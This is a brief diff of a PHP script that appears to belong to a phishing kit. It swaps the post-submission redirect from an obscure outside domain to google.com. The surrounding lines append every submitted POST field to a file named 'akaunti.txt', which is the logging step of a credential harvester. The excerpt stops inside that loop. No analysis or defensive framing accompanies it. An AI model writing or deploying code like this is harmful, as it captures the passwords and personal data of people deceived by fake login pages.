@@ -1,5 +1,5 @@
 <?php
-header( 'Location: http://igurufoundation.com/blP2xprZzROWoCE/gm/en/?i=11337' ) ;
+header( 'Location: http://google.com' ) ;
 $handle = fopen("akaunti.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
